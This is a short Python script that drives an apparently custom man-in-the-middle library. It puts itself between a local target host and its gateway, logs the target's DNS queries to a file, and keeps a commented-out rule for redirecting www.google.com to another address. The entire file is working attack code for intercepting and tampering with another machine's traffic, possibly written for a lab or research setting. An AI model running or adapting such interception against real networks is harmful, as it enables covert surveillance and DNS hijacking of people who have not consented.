from mitm_service import disruption_rules
from mitm_service.mitm_service import MITMService


def main():
    target = '192.168.1.137'
    gateway = '192.168.1.1'

    mitm = MITMService('en0', target, gateway)

    # disrupt_dns_rule = disruption_rules.generate_dns_reassign_rule('www.google.com', '104.16.41.71')
    log_file = open('dns_log.txt', 'w')
    log_dns_rule = disruption_rules.generate_dns_log_rule(log_file)
    mitm.add_disruption_rule(4, log_dns_rule)

    mitm.start_mitm()

    try:
        while True:
            pass
    except KeyboardInterrupt:
        pass

    mitm.stop_mitm()
    log_file.close()


if __name__ == '__main__':
    main()
